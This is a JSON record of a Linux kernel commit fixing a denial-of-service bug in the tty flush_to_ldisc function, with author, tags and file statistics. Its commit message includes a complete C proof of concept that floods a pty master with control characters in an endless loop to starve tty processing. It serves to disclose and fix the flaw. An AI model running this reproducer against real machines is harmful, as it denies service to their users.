{
  "hash": "e045fec48970df84647a47930fcf7a22ff7229c0",
  "hash_short": "e045fec4",
  "subject": "tty: prevent DOS in the flush_to_ldisc",
  "body": "There's a small window inside the flush_to_ldisc function,\nwhere the tty is unlocked and calling ldisc's receive_buf\nfunction. If in this window new buffer is added to the tty,\nthe processing might never leave the flush_to_ldisc function.\n\nThis scenario will hog the cpu, causing other tty processing\nstarving, and making it impossible to interface the computer\nvia tty.\n\nI was able to exploit this via pty interface by sending only\ncontrol characters to the master input, causing the flush_to_ldisc\nto be scheduled, but never actually generate any output.\n\nTo reproduce, please run multiple instances of following code.\n\n- SNIP\n#define _XOPEN_SOURCE\n#include <stdlib.h>\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\nint main(int argc, char **argv)\n{\n        int i, slave, master = getpt();\n        char buf[8192];\n\n        sprintf(buf, \"%s\", ptsname(master));\n        grantpt(master);\n        unlockpt(master);\n\n        slave = open(buf, O_RDWR);\n        if (slave < 0) {\n                perror(\"open slave failed\");\n                return 1;\n        }\n\n        for(i = 0; i < sizeof(buf); i++)\n                buf[i] = rand() % 32;\n\n        while(1) {\n                write(master, buf, sizeof(buf));\n        }\n\n        return 0;\n}\n- SNIP\n\nThe attached patch (based on -next tree) fixes this by checking on the\ntty buffer tail. Once it's reached, the current work is rescheduled\nand another could run.\n\nSigned-off-by: Jiri Olsa <jolsa@redhat.com>\nCc: stable <stable@kernel.org>\nAcked-by: Alan Cox <alan@lxorguk.ukuu.org.uk>\nSigned-off-by: Greg Kroah-Hartman <gregkh@suse.de>",
  "full_message": "tty: prevent DOS in the flush_to_ldisc\n\nThere's a small window inside the flush_to_ldisc function,\nwhere the tty is unlocked and calling ldisc's receive_buf\nfunction. If in this window new buffer is added to the tty,\nthe processing might never leave the flush_to_ldisc function.\n\nThis scenario will hog the cpu, causing other tty processing\nstarving, and making it impossible to interface the computer\nvia tty.\n\nI was able to exploit this via pty interface by sending only\ncontrol characters to the master input, causing the flush_to_ldisc\nto be scheduled, but never actually generate any output.\n\nTo reproduce, please run multiple instances of following code.\n\n- SNIP\n#define _XOPEN_SOURCE\n#include <stdlib.h>\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\nint main(int argc, char **argv)\n{\n        int i, slave, master = getpt();\n        char buf[8192];\n\n        sprintf(buf, \"%s\", ptsname(master));\n        grantpt(master);\n        unlockpt(master);\n\n        slave = open(buf, O_RDWR);\n        if (slave < 0) {\n                perror(\"open slave failed\");\n                return 1;\n        }\n\n        for(i = 0; i < sizeof(buf); i++)\n                buf[i] = rand() % 32;\n\n        while(1) {\n                write(master, buf, sizeof(buf));\n        }\n\n        return 0;\n}\n- SNIP\n\nThe attached patch (based on -next tree) fixes this by checking on the\ntty buffer tail. Once it's reached, the current work is rescheduled\nand another could run.\n\nSigned-off-by: Jiri Olsa <jolsa@redhat.com>\nCc: stable <stable@kernel.org>\nAcked-by: Alan Cox <alan@lxorguk.ukuu.org.uk>\nSigned-off-by: Greg Kroah-Hartman <gregkh@suse.de>",
  "author_name": "Jiri Olsa",
  "author_email": "jolsa@redhat.com",
  "author_date": "Mon Nov 8 19:01:47 2010 +0100",
  "author_date_iso": "2010-11-08T19:01:47+01:00",
  "committer_name": "Greg Kroah-Hartman",
  "committer_email": "gregkh@suse.de",
  "committer_date": "Tue Nov 9 15:02:02 2010 -0800",
  "committer_date_iso": "2010-11-09T15:02:02-08:00",
  "files_changed": [
    "drivers/tty/tty_buffer.c"
  ],
  "files_changed_count": 1,
  "stats": [
    {
      "file": "drivers/tty/tty_buffer.c",
      "insertions": 12,
      "deletions": 2
    }
  ],
  "total_insertions": 12,
  "total_deletions": 2,
  "total_changes": 14,
  "parents": [
    "c9bd9d01db02319c33767da5ee310ea37afda059"
  ],
  "branches": [
    "* development",
    "master",
    "remotes/origin/HEAD -> origin/master",
    "remotes/origin/master"
  ],
  "tags": [
    "v2.6.37",
    "v2.6.37-rc2",
    "v2.6.37-rc3",
    "v2.6.37-rc4",
    "v2.6.37-rc5",
    "v2.6.37-rc6",
    "v2.6.37-rc7",
    "v2.6.37-rc8",
    "v2.6.38",
    "v2.6.38-rc1"
  ],
  "is_merge": false,
  "security_info": {
    "cve_ids": [],
    "security_keywords": [
      "exploit"
    ]
  },
  "fix_type": "security",
  "file_results": [
    {
      "file": "drivers/tty/tty_buffer.c",
      "pre_version": false,
      "post_version": true,
      "patch": true
    }
  ]
}